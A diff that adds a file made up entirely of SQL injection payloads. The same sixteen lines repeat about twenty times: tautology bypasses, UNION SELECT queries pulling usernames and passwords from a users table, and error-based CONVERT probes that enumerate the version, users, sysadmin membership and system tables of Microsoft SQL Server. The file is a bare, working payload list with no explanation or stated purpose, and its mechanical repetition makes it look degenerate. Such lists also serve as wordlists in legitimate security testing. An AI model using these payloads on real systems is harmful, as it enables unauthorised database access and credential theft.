@@ -1,0 +1,320 @@
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND 1=CONVERT(int, (SELECT host_name()))--
+' AND 1=CONVERT(int, (SELECT current_user))--
+' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--
+' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--
+' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--
